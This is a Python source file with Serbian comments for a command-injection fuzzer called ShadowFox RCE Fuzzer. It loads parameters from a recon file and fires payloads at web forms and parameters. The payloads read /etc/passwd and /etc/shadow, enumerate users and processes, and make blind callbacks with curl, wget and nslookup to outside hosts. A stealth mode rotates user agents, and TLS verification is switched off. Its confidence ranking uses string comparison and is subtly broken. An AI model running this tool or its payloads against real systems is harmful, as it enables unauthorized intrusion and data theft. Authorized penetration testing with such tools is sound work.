#!/usr/bin/env python3
"""
🦊 SHADOWFOX RCE FUZZER MODULE
Shell Hunter - Remote Code Execution payload fuzzer
Autor: Whitefox980 | Verzija: 2025.06.06

⚠️  SAMO ZA ETIČKO TESTIRANJE NA AUTORIZOVANIM METAMA!
"""

import requests
import json
import time
import random
import re
import base64
import urllib.parse
from itertools import product
import warnings
warnings.filterwarnings("ignore", category=requests.packages.urllib3.exceptions.InsecureRequestWarning)

class ShadowRCEFuzzer:
    def __init__(self):
        self.session = requests.Session()
        self.results = {
            "mission_info": {},
            "rce_findings": [],
            "payload_stats": {},
            "vulnerable_parameters": [],
            "tested_endpoints": [],
            "error_responses": [],
            "statistics": {}
        }
        self.meta_config = {}
        self.recon_data = {}
        
        # 🔥 RCE PAYLOAD ARSENAL
        self.rce_payloads = {
            "unix_basic": [
                "; ls",
                "&& whoami", 
                "| id",
                "; cat /etc/passwd",
                "&& uname -a",
                "| ps aux",
                "; pwd",
                "&& env",
                "| whoami",
                "; id",
                "&& cat /etc/hosts",
                "| cat /etc/passwd"
            ],
            "unix_advanced": [
                "; ls -la /",
                "&& find / -name '*.conf' 2>/dev/null",
                "| cat /proc/version",
                "; netstat -tulpn",
                "&& cat /etc/shadow",
                "| ps -ef",
                "; mount",
                "&& df -h",
                "| cat /etc/issue",
                "; w",
                "&& last",
                "| ifconfig"
            ],
            "windows_basic": [
                "& dir",
                "&& whoami",
                "| dir",
                "; dir",
                "&& ipconfig",
                "| whoami",
                "; whoami",
                "&& systeminfo",
                "| ipconfig /all",
                "; net user",
                "&& tasklist",
                "| net localgroup administrators"
            ],
            "windows_advanced": [
                "&& dir c:\\windows\\system32",
                "| type c:\\windows\\system32\\drivers\\etc\\hosts",
                "; reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion",
                "&& wmic os get caption",
                "| net share",
                "; sc query",
                "&& netstat -an",
                "| wmic process list",
                "; powershell get-process",
                "&& dir c:\\users",
                "| powershell get-childitem c:\\"
            ],
            "encoded_payloads": [],
            "blind_payloads": [
                "; sleep 5",
                "&& ping -c 3 127.0.0.1",
                "| timeout 5",
                "; ping -n 3 127.0.0.1",
                "&& curl http://burpcollaborator.net",
                "| wget http://example.com/callback",
                "; nslookup burpcollaborator.net"
            ],
            "injection_contexts": [
                "$({})",
                "`{}`",
                "${{{}}}", 
                "{{{}}}",
                "%7B%7B{{}}%7D%7D"  # URL encoded
            ]
        }
        
        # 🎯 RCE DETECTION SIGNATURES
        self.rce_signatures = {
            "command_output": [
                r"root:x:0:0:",  # /etc/passwd
                r"uid=\d+\(\w+\)",  # id output
                r"Linux \w+ \d+\.\d+",  # uname
                r"total \d+",  # ls -la
                r"Directory of",  # Windows dir
                r"Volume in drive",  # Windows dir
                r"Windows IP Configuration",  # ipconfig
                r"Ethernet adapter",  # ipconfig
                r"PID\s+PPID",  # ps aux
                r"LISTEN\s+\d+",  # netstat
                r"Microsoft Windows",  # systeminfo
                r"Administrator\s+",  # net localgroup
                r"/bin/bash",  # shell paths
                r"/usr/bin",
                r"C:\\Windows\\",
                r"C:\\Program Files"
            ],
            "error_signatures": [
                r"sh: .*: command not found",
                r"bash: .*: command not found",
                r"'.*' is not recognized as an internal",
                r"The system cannot find the file specified",
                r"Permission denied",
                r"Access is denied",
                r"No such file or directory",
                r"Syntax error",
                r"unexpected token"
            ],
            "execution_indicators": [
                r"Fatal error.*eval\(\)",
                r"Warning.*shell_exec",
                r"system\(\): Cannot execute",
                r"proc_open\(\): CreateProcess failed",
                r"Warning.*exec\(\)",
                r"call_user_func_array\(\) expects"
            ]
        }
        
    def load_configurations(self):
        """Učitava Meta config i Recon podatke"""
        try:
            # Meta config
            with open('Meta/mission_info.json', 'r') as f:
                self.meta_config = json.load(f)
                self.results["mission_info"] = self.meta_config
                
            # Recon data
            with open('ShadowRecon/shadow_recon.json', 'r') as f:
                self.recon_data = json.load(f)
                
            print(f"🧠 [META] Misija: {self.meta_config.get('mission_id', 'UNKNOWN')}")
            print(f"🔍 [RECON] Učitano {len(self.recon_data.get('discovered_parameters', {}))} parametara")
            
        except FileNotFoundError as e:
            print(f"❌ [ERROR] Fajl nije pronađen: {str(e)}")
            print("🔧 [FIX] Pokreni shadow_recon.py pre ovog modula")
            exit(1)
            
    def setup_session(self):
        """Konfiguracija HTTP sesije"""
        headers = self.meta_config.get('default_headers', {})
        self.session.headers.update(headers)
        
        if self.meta_config.get('stealth_mode', False):
            user_agents = [
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
            ]
            self.session.headers['User-Agent'] = random.choice(user_agents)
            
        self.session.verify = False
        self.session.timeout = 15
        
    def prepare_payloads(self):
        """Priprema i enkodovanje payload-a"""
        all_payloads = []
        
        # Osnivni payload-i
        for category, payloads in self.rce_payloads.items():
            if category != "encoded_payloads" and category != "injection_contexts":
                all_payloads.extend(payloads)
                
        # Enkodovani payload-i
        encoded_payloads = []
        for payload in all_payloads[:10]:  # Ograniči na top 10 za enkodovanje
            # URL encoding
            encoded_payloads.append(urllib.parse.quote(payload))
            # Double URL encoding
            encoded_payloads.append(urllib.parse.quote(urllib.parse.quote(payload)))
            # Base64 encoding
            try:
                b64_payload = base64.b64encode(payload.encode()).decode()
                encoded_payloads.append(b64_payload)
            except:
                pass
                
        self.rce_payloads["encoded_payloads"] = encoded_payloads
        
        # Context injection payload-i
        context_payloads = []
        basic_commands = ["id", "whoami", "pwd", "dir"]
        
        for context in self.rce_payloads["injection_contexts"]:
            for cmd in basic_commands:
                try:
                    context_payloads.append(context.format(cmd))
                except:
                    pass
                    
        self.rce_payloads["injection_contexts"] = context_payloads
        
    def intelligent_delay(self):
        """Pametno kašnjenje"""
        if self.meta_config.get('stealth_mode', False):
            delay = self.meta_config.get('rate_delay_seconds', 2.5)
            time.sleep(delay + random.uniform(0, 1))
        else:
            time.sleep(random.uniform(0.5, 1.5))
            
    def analyze_response(self, response_text, payload):
        """Analiza odgovora za RCE indikatore"""
        findings = []
        
        # Proveri command output signatures
        for signature in self.rce_signatures["command_output"]:
            matches = re.findall(signature, response_text, re.IGNORECASE | re.MULTILINE)
            if matches:
                findings.append({
                    "type": "command_output",
                    "signature": signature,
                    "matches": matches,
                    "confidence": "HIGH"
                })
                
        # Proveri error signatures
        for signature in self.rce_signatures["error_signatures"]:
            matches = re.findall(signature, response_text, re.IGNORECASE)
            if matches:
                findings.append({
                    "type": "execution_error",
                    "signature": signature,
                    "matches": matches,
                    "confidence": "MEDIUM"
                })
                
        # Proveri execution indicators
        for signature in self.rce_signatures["execution_indicators"]:
            matches = re.findall(signature, response_text, re.IGNORECASE)
            if matches:
                findings.append({
                    "type": "execution_indicator",
                    "signature": signature,
                    "matches": matches,
                    "confidence": "MEDIUM"
                })
                
        # Slepe RCE provere (time-based)
        if "sleep" in payload.lower() or "ping" in payload.lower():
            # Ovo bi trebalo da bude implementirano sa time measurement
            # Za sada samo označava kao potencijalno
            if len(response_text) < 100:  # Kratki odgovor može biti indicator
                findings.append({
                    "type": "blind_rce_indicator",
                    "signature": "Short response to time-based payload",
                    "confidence": "LOW"
                })
                
        return findings
        
    def test_parameter_rce(self, url, param_name, method="GET"):
        """Test RCE na specifičnom parametru"""
        results = []
        
        # Pripremi base podatke
        base_data = {param_name: "test_value"}
        
        print(f"🎯 [RCE] Testing: {param_name} na {url}")
        
        # Test svaki payload
        for category, payloads in self.rce_payloads.items():
            for payload in payloads:
                try:
                    self.intelligent_delay()
                    
                    # Pripremi podatke sa payload-om
                    test_data = base_data.copy()
                    test_data[param_name] = payload
                    
                    # Pošalji zahtev
                    start_time = time.time()
                    if method.upper() == "GET":
                        response = self.session.get(url, params=test_data)
                    else:
                        response = self.session.post(url, data=test_data)
                    response_time = time.time() - start_time
                    
                    # Analiziraj odgovor
                    findings = self.analyze_response(response.text, payload)
                    
                    if findings:
                        result = {
                            "url": url,
                            "parameter": param_name,
                            "payload": payload,
                            "payload_category": category,
                            "method": method,
                            "status_code": response.status_code,
                            "response_time": response_time,
                            "content_length": len(response.text),
                            "findings": findings,
                            "response_snippet": response.text[:500],
                            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
                        }
                        results.append(result)
                        
                        # Određi severity na osnovu findings
                        max_confidence = max([f["confidence"] for f in findings])
                        if max_confidence == "HIGH":
                            print(f"🔴 [CRITICAL RCE] {param_name}: {payload}")
                        elif max_confidence == "MEDIUM":
                            print(f"🟡 [POSSIBLE RCE] {param_name}: {payload}")
                        else:
                            print(f"🔵 [RCE INDICATOR] {param_name}: {payload}")
                            
                    # Prati payload statistike
                    if category not in self.results["payload_stats"]:
                        self.results["payload_stats"][category] = {"tested": 0, "hits": 0}
                    self.results["payload_stats"][category]["tested"] += 1
                    if findings:
                        self.results["payload_stats"][category]["hits"] += 1
                        
                except Exception as e:
                    print(f"❌ [RCE ERROR] {param_name} - {payload}: {str(e)}")
                    self.results["error_responses"].append({
                        "url": url,
                        "parameter": param_name,
                        "payload": payload,
                        "error": str(e),
                        "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
                    })
                    
        return results
        
    def test_forms_rce(self):
        """Test RCE na formama iz recon podataka"""
        forms = self.recon_data.get("forms_found", [])
        print(f"📝 [RCE] Testiranje {len(forms)} formi...")
        
        for form in forms:
            form_url = form.get("action", "")
            method = form.get("method", "GET")
            inputs = form.get("inputs", [])
            
            if not form_url:
                continue
                
            print(f"📝 [FORM RCE] {method} {form_url}")
            
            for input_field in inputs:
                param_name = input_field.get("name")
                if param_name and len(param_name) > 1:
                    rce_results = self.test_parameter_rce(form_url, param_name, method)
                    self.results["rce_findings"].extend(rce_results)
                    
                    if rce_results:
                        self.results["vulnerable_parameters"].append({
                            "parameter": param_name,
                            "url": form_url,
                            "method": method,
                            "source": "form",
                            "vulnerability_count": len(rce_results)
                        })
                        
    def test_discovered_parameters_rce(self):
        """Test RCE na svim otkrivenim parametrima"""
        discovered_params = self.recon_data.get("discovered_parameters", {})
        target_root = self.meta_config.get("target_root", "")
        
        print(f"🔍 [RCE] Testiranje {len(discovered_params)} otkrivenih parametara...")
        
        for param_name, param_data in discovered_params.items():
            if isinstance(param_data, dict) and "data" in param_data:
                param_sources = param_data["data"]
            else:
                param_sources = param_data if isinstance(param_data, list) else []
                
            # Test na target_root URL-u
            if target_root:
                rce_results = self.test_parameter_rce(target_root, param_name, "GET")
                self.results["rce_findings"].extend(rce_results)
                
                if rce_results:
                    self.results["vulnerable_parameters"].append({
                        "parameter": param_name,
                        "url": target_root,
                        "method": "GET",
                        "source": "discovered",
                        "vulnerability_count": len(rce_results)
                    })
                    
            # Test i na originalnim URL-ovima gde je parametar otkrivena
            for source in param_sources[:2]:  # Ograniči na prva 2 URL-a
                if isinstance(source, dict) and "url" in source:
                    source_url = source["url"]
                    if source_url != target_root:
                        rce_results = self.test_parameter_rce(source_url, param_name, "GET")
                        self.results["rce_findings"].extend(rce_results)
                        
    def generate_statistics(self):
        """Generisanje RCE statistika"""
        total_findings = len(self.results["rce_findings"])
        
        # Grupisanje po confidence level
        confidence_stats = {"HIGH": 0, "MEDIUM": 0, "LOW": 0}
        severity_stats = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0}
        
        for finding in self.results["rce_findings"]:
            findings = finding.get("findings", [])
            if findings:
                max_confidence = max([f["confidence"] for f in findings])
                confidence_stats[max_confidence] += 1
                
                # Mapiranje confidence -> severity
                if max_confidence == "HIGH":
                    severity_stats["CRITICAL"] += 1
                elif max_confidence == "MEDIUM":
                    severity_stats["HIGH"] += 1
                else:
                    severity_stats["MEDIUM"] += 1
                    
        # Top parametri po ranjivostima
        param_vuln_count = {}
        for finding in self.results["rce_findings"]:
            param = finding.get("parameter")
            if param:
                param_vuln_count[param] = param_vuln_count.get(param, 0) + 1
                
        top_vulnerable_params = sorted(param_vuln_count.items(), 
                                     key=lambda x: x[1], reverse=True)[:5]
        
        # Payload effectiveness
        payload_effectiveness = {}
        for category, stats in self.results["payload_stats"].items():
            if stats["tested"] > 0:
                effectiveness = (stats["hits"] / stats["tested"]) * 100
                payload_effectiveness[category] = {
                    "tested": stats["tested"],
                    "hits": stats["hits"],
                    "effectiveness_percent": round(effectiveness, 2)
                }
                
        self.results["statistics"] = {
            "total_rce_findings": total_findings,
            "confidence_breakdown": confidence_stats,
            "severity_breakdown": severity_stats,
            "unique_vulnerable_parameters": len(self.results["vulnerable_parameters"]),
            "total_errors": len(self.results["error_responses"]),
            "top_vulnerable_parameters": top_vulnerable_params,
            "payload_effectiveness": payload_effectiveness,
            "scan_timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
            "scan_duration": "calculated_in_main"
        }
        
    def save_results(self):
        """Snimanje RCE rezultata"""
        output_file = "Napad/attack_rce_fuzz.json"
        
        try:
            with open(output_file, 'w') as f:
                json.dump(self.results, f, indent=2, ensure_ascii=False)
            print(f"💾 [SAVE] RCE rezultati snimljeni: {output_file}")
        except Exception as e:
            print(f"❌ [SAVE ERROR] {str(e)}")
            
    def display_summary(self):
        """Prikaz sažetka RCE napada"""
        stats = self.results["statistics"]
        print("\n🔥 SHADOWFOX RCE FUZZER - SAŽETAK")
        print("=" * 50)
        print(f"🎯 RCE Findings: {stats['total_rce_findings']}")
        print(f"🔴 Critical: {stats['severity_breakdown']['CRITICAL']}")
        print(f"🟡 High: {stats['severity_breakdown']['HIGH']}")
        print(f"🔵 Medium: {stats['severity_breakdown']['MEDIUM']}")
        print(f"⚠️  Errors: {stats['total_errors']}")
        
        if stats['top_vulnerable_parameters']:
            print(f"\n🏆 TOP RANJIVI PARAMETRI:")
            for param, count in stats['top_vulnerable_parameters']:
                print(f"   • {param}: {count} findings")
                
        if stats['payload_effectiveness']:
            print(f"\n📊 PAYLOAD EFFECTIVENESS:")
            for category, eff_data in stats['payload_effectiveness'].items():
                print(f"   • {category}: {eff_data['effectiveness_percent']}% "
                      f"({eff_data['hits']}/{eff_data['tested']})")
                      
        print(f"\n✅ Detaljan izveštaj: Napad/attack_rce_fuzz.json")
        
        # Sigurnosno upozorenje
        if stats['total_rce_findings'] > 0:
            print(f"\n⚠️  SIGURNOSNO UPOZORENJE:")
            print(f"   Pronađene su potencijalne RCE ranjivosti!")
            print(f"   Obavesti odgovorne lica ODMAH!")
            
    def run_rce_fuzzing(self):
        """Glavna RCE fuzzing operacija"""
        start_time = time.time()
        
        print("🔥 SHADOWFOX RCE FUZZER - SHELL HUNTING")
        print("=" * 50)
        print("⚠️  ETIČKO TESTIRANJE SAMO NA AUTORIZOVANIM METAMA!")
        print("=" * 50)
        
        # 1. Učitaj konfiguracije
        self.load_configurations()
        
        # 2. Podesi sesiju
        self.setup_session()
        
        # 3. Pripremi payload-e
        print("🔧 [RCE] Priprema payload arsenal-a...")
        self.prepare_payloads()
        
        # 4. Test forme
        print("📝 [RCE] Testiranje formi...")
        self.test_forms_rce()
        
        # 5. Test otkrivene parametre
        print("🔍 [RCE] Testiranje otkrivenih parametara...")
        self.test_discovered_parameters_rce()
        
        # 6. Generiši statistike
        scan_duration = time.time() - start_time
        self.results["statistics"] = self.results.get("statistics", {})
        self.results["statistics"]["scan_duration"] = f"{scan_duration:.2f} seconds"
        
        print("📊 [RCE] Generisanje statistika...")
        self.generate_statistics()
        
        # 7. Snimi rezultate
        self.save_results()
        
        # 8. Prikaži sažetak
        self.display_summary()

def main():
    fuzzer = ShadowRCEFuzzer()
    fuzzer.run_rce_fuzzing()

if __name__ == "__main__":
    main()
